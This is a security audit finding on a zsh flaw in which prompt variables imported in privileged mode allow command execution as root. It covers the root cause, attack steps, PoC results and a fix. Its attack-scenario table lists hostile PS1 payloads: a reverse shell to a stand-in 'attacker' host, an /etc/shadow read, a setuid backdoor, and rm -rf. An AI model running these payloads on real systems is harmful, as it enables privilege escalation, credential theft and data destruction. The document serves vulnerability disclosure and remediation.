# Finding 5: PS1/PROMPT Imported in Privileged Mode Enables Command Execution

## Vulnerability Summary

The `PS1` and `PROMPT` shell variables are imported from the environment when
zsh starts in privileged mode (setuid/setgid or `zsh -p`). Because zsh's prompt
expansion supports command substitution via `$(command)` syntax (when
`PROMPT_SUBST` is enabled), an attacker who controls the environment can achieve
arbitrary command execution at the elevated effective UID.

**CWE-78**: Improper Neutralization of Special Elements used in an OS Command
(OS Command Injection)

## Root Cause

In `Src/params.c`, prompt variables are defined using different macros:

```c
// Line 369-370: The two macros
#define IPDEF7(A,B)  {{NULL,A,PM_SCALAR|PM_SPECIAL}, ...}          // NO protection
#define IPDEF7R(A,B) {{NULL,A,PM_SCALAR|PM_SPECIAL|PM_DONTIMPORT_SUID}, ...}  // PROTECTED

// Lines 376, 419-420: PS1 and PROMPT use IPDEF7 (UNPROTECTED)
IPDEF7("PS1", &prompt);       // line 376
IPDEF7("prompt", &prompt);    // line 419
IPDEF7("PROMPT", &prompt);    // line 420

// Line 383: PS4 uses IPDEF7R (PROTECTED — correctly)
IPDEF7R("PS4", &prompt4);     // line 383
```

The `PM_DONTIMPORT_SUID` flag prevents a variable from being imported from the
environment when zsh detects a privilege mismatch (ruid != euid or rgid != egid)
or runs with the `-p` flag. PS1 and PROMPT lack this flag; PS4 has it.

For comparison, `MODULE_PATH` is also properly protected:
```c
IPDEF8("MODULE_PATH", ..., PM_DONTIMPORT|PM_RESTRICTED|PM_TIED);
```

## Attack Vector

### Prerequisites

1. A system where zsh is installed setuid-root (or any setuid binary that
   executes zsh), OR any scenario where an attacker controls the environment
   of a privileged zsh invocation.
2. `PROMPT_SUBST` must be enabled. This is:
   - **ON by default** in sh and ksh emulation modes (`OPT_BOURNE`)
   - Commonly enabled in distribution zshrc files
   - Can be set via `-o promptsubst` on the command line

### Attack Steps

1. Attacker sets `PS1` (or `PROMPT`) in the environment:
   ```bash
   export PS1='$(id > /tmp/pwned)$ '
   ```

2. A setuid-root zsh binary is invoked (or `zsh -p` simulating the same):
   ```bash
   /usr/bin/zsh-setuid    # real setuid scenario
   zsh --emulate sh -p    # sh emulation: PROMPT_SUBST is ON by default
   ```

3. When zsh renders the interactive prompt, `promptexpand()` in `Src/prompt.c`
   calls `parsestr()` and `singsub()` on the PS1 value (line 181-201),
   executing the embedded `$(id > /tmp/pwned)` command.

4. The command runs with the effective UID of the zsh process (euid=0 for
   setuid-root).

### PoC Results

```
=== TEST 1: PS1 is imported from environment in privileged (-p) mode ===
[result] PS1 inside privileged zsh: 'ATTACKER_CONTROLLED_PS1'
  >>> CONFIRMED: PS1 is imported from environment in privileged mode

=== TEST 4: Command execution via PS1 in privileged + sh emulation ===
  Contents: uid=0(root) gid=0(root) groups=0(root)
  >>> CONFIRMED: Command in PS1 executed during interactive prompt

=== TEST 6: Sensitive file read via PS1 (e.g., /etc/shadow) ===
  >>> CONFIRMED: File contents exfiltrated via PS1 prompt expansion
```

## Impact

- **Severity**: High (CVSS ~7.8 local privilege escalation)
- **Confidentiality**: An attacker can read files accessible only to euid
  (e.g., `/etc/shadow` on setuid-root zsh)
- **Integrity**: An attacker can write arbitrary files as euid
- **Availability**: An attacker can execute destructive commands (e.g.,
  `$(rm -rf /)`) as euid
- **Privilege Escalation**: Full code execution at the elevated privilege level

### Attack Scenarios

| Scenario | PS1 Payload | Effect |
|----------|------------|--------|
| Credential theft | `$(cat /etc/shadow > /tmp/x)` | Leaks password hashes |
| Backdoor install | `$(cp /bin/bash /tmp/b && chmod 4755 /tmp/b)` | Persistent root shell |
| Reverse shell | `$(bash -i >& /dev/tcp/attacker/4444 0>&1)` | Remote root access |
| Data destruction | `$(rm -rf /important/data)` | Data loss |

## Affected Variables

| Variable | Macro | PM_DONTIMPORT_SUID | Status |
|----------|-------|-------------------|--------|
| PS1 | IPDEF7 | NO | VULNERABLE |
| PROMPT | IPDEF7 | NO | VULNERABLE |
| prompt | IPDEF7 | NO | VULNERABLE |
| PS2 | IPDEF7 | NO | VULNERABLE |
| PROMPT2 | IPDEF7 | NO | VULNERABLE |
| PROMPT3 | IPDEF7 | NO | VULNERABLE |
| PS3 | IPDEF7 | NO | VULNERABLE |
| PS4 | IPDEF7R | YES | Protected |
| PROMPT4 | IPDEF7 | NO | VULNERABLE |
| SPROMPT | IPDEF7 | NO | VULNERABLE |
| MODULE_PATH | IPDEF8 | PM_DONTIMPORT | Protected |

Note: PROMPT4 (alias for PS4) uses IPDEF7 without PM_DONTIMPORT_SUID, even
though PS4 itself is protected with IPDEF7R. This is an additional
inconsistency.

## Recommended Fix

Change all prompt variable definitions from `IPDEF7` to `IPDEF7R` in
`Src/params.c` to add `PM_DONTIMPORT_SUID`:

```c
// Before (vulnerable):
IPDEF7("PS1", &prompt),
IPDEF7("prompt", &prompt),
IPDEF7("PROMPT", &prompt),

// After (fixed):
IPDEF7R("PS1", &prompt),
IPDEF7R("prompt", &prompt),
IPDEF7R("PROMPT", &prompt),
```

This matches the existing protection on PS4 and is consistent with the
treatment of other security-sensitive variables like MODULE_PATH.

## References

- PoC: `security/poc/finding5_ps1_poc.sh`
- Source: `Src/params.c` lines 369-384 (IPDEF7/IPDEF7R definitions), 419-423
- Prompt expansion: `Src/prompt.c` lines 171-236 (`promptexpand()`)
- PROMPT_SUBST option: `Src/options.c` line 233 (default in OPT_BOURNE modes)
